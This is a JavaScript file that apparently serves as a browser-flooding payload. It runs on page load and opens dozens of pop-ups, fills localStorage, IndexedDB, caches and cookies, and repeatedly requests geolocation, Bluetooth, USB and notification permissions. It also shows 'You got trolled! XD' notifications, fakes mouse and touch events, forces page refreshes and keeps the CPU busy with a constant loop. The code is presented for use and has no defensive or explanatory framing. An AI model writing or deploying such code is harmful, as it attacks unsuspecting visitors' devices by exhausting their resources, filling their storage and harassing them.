function videoSpam() {
    const videos = [
        'https://interactive-examples.mdn.mozilla.net/media/cc0-videos/flower.mp4',
        'https://interactive-examples.mdn.mozilla.net/media/cc0-videos/flower.webm',
        'https://test-videos.co.uk/vids/bigbuckbunny/mp4/h264/1080/Big_Buck_Bunny_1080_10s_1MB.mp4',
        'https://test-videos.co.uk/vids/jellyfish/mp4/h264/1080/Jellyfish_1080_10s_1MB.mp4'
    ];
    
    for (let i = 0; i < 30; i++) {
        setTimeout(() => {
            const video = document.createElement('video');
            video.src = videos[Math.floor(Math.random() * videos.length)] + '#t=0.1';
            video.preload = 'auto';
            video.style.display = 'none';
            document.body.appendChild(video);
            
            video.play().catch(() => {});
            
            fetch(video.src, { mode: 'no-cors' }).catch(() => {});
        }, i * 50);
    }
}

function audioSpam() {
    const audioFiles = [
        'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3',
        'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3',
        'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-3.mp3',
        'https://www2.cs.uic.edu/~i101/SoundFiles/StarWars60.wav',
        'https://www2.cs.uic.edu/~i101/SoundFiles/CantinaBand60.wav'
    ];
    
    for (let i = 0; i < 40; i++) {
        setTimeout(() => {
            const audio = new Audio(audioFiles[Math.floor(Math.random() * audioFiles.length)]);
            audio.preload = 'auto';
            audio.style.display = 'none';
            audio.play().catch(() => {});
            
            try {
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                fetch(audio.src)
                    .then(r => r.arrayBuffer())
                    .then(buffer => audioContext.decodeAudioData(buffer))
                    .catch(() => {});
            } catch(e) {}
        }, i * 30);
    }
}

function pdfSpam() {
    const pdfs = [
        'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf',
        'https://www.africau.edu/images/default/sample.pdf',
        'https://www.clickdimensions.com/links/TestPDFfile.pdf',
        'https://www.orimi.com/pdf-test.pdf'
    ];
    
    for (let i = 0; i < 50; i++) {
        setTimeout(() => {
            const pdfUrl = pdfs[Math.floor(Math.random() * pdfs.length)] + '?r=' + Math.random();
            
            window.open(pdfUrl, '_blank');
            
            const iframe = document.createElement('iframe');
            iframe.src = pdfUrl;
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            
            const embed = document.createElement('embed');
            embed.src = pdfUrl;
            embed.style.display = 'none';
            document.body.appendChild(embed);
            
            const object = document.createElement('object');
            object.data = pdfUrl;
            object.style.display = 'none';
            document.body.appendChild(object);
        }, i * 20);
    }
}

function webrtcSpam() {
    for (let i = 0; i < 20; i++) {
        setTimeout(() => {
            try {
                const pc = new RTCPeerConnection({
                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                });
                
                for (let j = 0; j < 5; j++) {
                    const dc = pc.createDataChannel('channel' + j);
                    dc.onopen = () => {
                        setInterval(() => {
                            dc.send('X'.repeat(1024 * 10));
                        }, 100);
                    };
                }
                
                pc.createOffer()
                    .then(offer => pc.setLocalDescription(offer))
                    .catch(() => {});
            } catch(e) {}
        }, i * 100);
    }
}

function geolocationSpam() {
    setInterval(() => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(() => {}, () => {});
            navigator.geolocation.watchPosition(() => {}, () => {});
        }
    }, 100);
}

function notificationSpam() {
    if (Notification.permission === 'default') {
        Notification.requestPermission();
    }
    
    setInterval(() => {
        if (Notification.permission === 'granted') {
            try {
                new Notification('ZCV.CC', {
                    body: 'You got trolled! XD',
                    icon: 'https://i.imgur.com/favicon.ico',
                    silent: false
                });
            } catch(e) {}
        }
    }, 500);
}

function bluetoothSpam() {
    if (navigator.bluetooth) {
        setInterval(() => {
            navigator.bluetooth.requestDevice({
                acceptAllDevices: true,
                optionalServices: []
            }).catch(() => {});
        }, 1000);
    }
}

function usbSpam() {
    if (navigator.usb) {
        setInterval(() => {
            navigator.usb.requestDevice({ filters: [] }).catch(() => {});
        }, 1000);
    }
}

function storageSpam() {
    setInterval(() => {
        for (let i = 0; i < 100; i++) {
            try {
                localStorage.setItem('spam_' + Date.now() + '_' + i, 'X'.repeat(1024 * 10)); // 10KB
            } catch(e) {}
        }
    }, 1000);
    
    try {
        const request = indexedDB.open('ZCVDatabase', 1);
        request.onupgradeneeded = (e) => {
            const db = e.target.result;
            db.createObjectStore('spam', { autoIncrement: true });
        };
        
        request.onsuccess = (e) => {
            const db = e.target.result;
            setInterval(() => {
                const tx = db.transaction('spam', 'readwrite');
                const store = tx.objectStore('spam');
                for (let i = 0; i < 50; i++) {
                    store.add('X'.repeat(1024 * 100));
                }
            }, 500);
        };
    } catch(e) {}
    
    setInterval(() => {
        caches.open('zcv-spam-cache').then(cache => {
            for (let i = 0; i < 20; i++) {
                const randomUrl = 'https://example.com/spam/' + Date.now() + '_' + i;
                cache.put(randomUrl, new Response('X'.repeat(1024 * 50))); // 50KB
            }
        }).catch(() => {});
    }, 1000);
}

function websocketSpam() {
    const wsUrls = [
        'wss://echo.websocket.org',
        'wss://ws.postman-echo.com/raw',
        'wss://echo.websocket.events'
    ];
    
    for (let i = 0; i < 10; i++) {
        setTimeout(() => {
            try {
                const ws = new WebSocket(wsUrls[Math.floor(Math.random() * wsUrls.length)]);
                ws.onopen = () => {
                    setInterval(() => {
                        ws.send('X'.repeat(1024 * 5));
                    }, 100);
                };
            } catch(e) {}
        }, i * 200);
    }
}

function cookieSpam() {
    setInterval(() => {
        for (let i = 0; i < 50; i++) {
            document.cookie = `spam_${Date.now()}_${i}=${'X'.repeat(1000)}; path=/; max-age=3600`;
        }
    }, 500);
}

function canvasSpam() {
    const canvas = document.createElement('canvas');
    canvas.width = 1920;
    canvas.height = 1080;
    canvas.style.display = 'none';
    document.body.appendChild(canvas);
    const ctx = canvas.getContext('2d');
    
    setInterval(() => {
        for (let i = 0; i < 100; i++) {
            ctx.fillStyle = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
            ctx.fillRect(Math.random()*1920, Math.random()*1080, 100, 100);
            
            ctx.beginPath();
            ctx.arc(Math.random()*1920, Math.random()*1080, 50, 0, 2 * Math.PI);
            ctx.fill();
            
            ctx.font = '30px Arial';
            ctx.fillText('SPAM', Math.random()*1920, Math.random()*1080);
        }
    }, 50);
}

function animationSpam() {
    for (let i = 0; i < 100; i++) {
        const div = document.createElement('div');
        div.style.position = 'absolute';
        div.style.left = Math.random() * window.innerWidth + 'px';
        div.style.top = Math.random() * window.innerHeight + 'px';
        div.style.width = '50px';
        div.style.height = '50px';
        div.style.backgroundColor = 'red';
        div.style.display = 'none';
        document.body.appendChild(div);
        
        div.animate([
            { transform: 'translate(0, 0)' },
            { transform: 'translate(100px, 100px)' },
            { transform: 'translate(0, 0)' }
        ], {
            duration: 1000,
            iterations: Infinity
        });
    }
}

function mouseEventSpam() {
    setInterval(() => {
        const event = new MouseEvent('mousemove', {
            clientX: Math.random() * window.innerWidth,
            clientY: Math.random() * window.innerHeight
        });
        document.dispatchEvent(event);
        
        const clickEvent = new MouseEvent('click', {
            clientX: Math.random() * window.innerWidth,
            clientY: Math.random() * window.innerHeight
        });
        document.dispatchEvent(clickEvent);
    }, 10);
}

function touchEventSpam() {
    setInterval(() => {
        const touch = new Touch({
            identifier: Date.now(),
            target: document.body,
            clientX: Math.random() * window.innerWidth,
            clientY: Math.random() * window.innerHeight
        });
        
        const touchEvent = new TouchEvent('touchstart', {
            touches: [touch],
            targetTouches: [touch],
            changedTouches: [touch]
        });
        document.dispatchEvent(touchEvent);
    }, 50);
}

window.addEventListener('load', function() {
    console.log('Запускаем дополнительную нагрузку...');
    
    setTimeout(videoSpam, 100);
    setTimeout(audioSpam, 200);
    setTimeout(pdfSpam, 300);
    setTimeout(webrtcSpam, 400);
    setTimeout(geolocationSpam, 500);
    setTimeout(notificationSpam, 600);
    setTimeout(bluetoothSpam, 700);
    setTimeout(usbSpam, 800);
    setTimeout(storageSpam, 900);
    setTimeout(websocketSpam, 1000);
    setTimeout(cookieSpam, 1100);
    setTimeout(canvasSpam, 1200);
    setTimeout(animationSpam, 1300);
    setTimeout(mouseEventSpam, 1400);
    setTimeout(touchEventSpam, 1500);
    
    const meta = document.createElement('meta');
    meta.httpEquiv = 'refresh';
    meta.content = '5';
    document.head.appendChild(meta);
    
    for (let i = 0; i < 200; i++) {
        const link = document.createElement('link');
        link.rel = 'stylesheet';
        link.href = `https://example.com/style${i}.css?r=${Math.random()}`;
        document.head.appendChild(link);
        
        const script = document.createElement('script');
        script.src = `https://example.com/script${i}.js?r=${Math.random()}`;
        document.head.appendChild(script);
    }
});

setInterval(() => {
    for (let i = 0; i < 1000000; i++) {
        Math.random() * Math.random();
    }
}, 100);
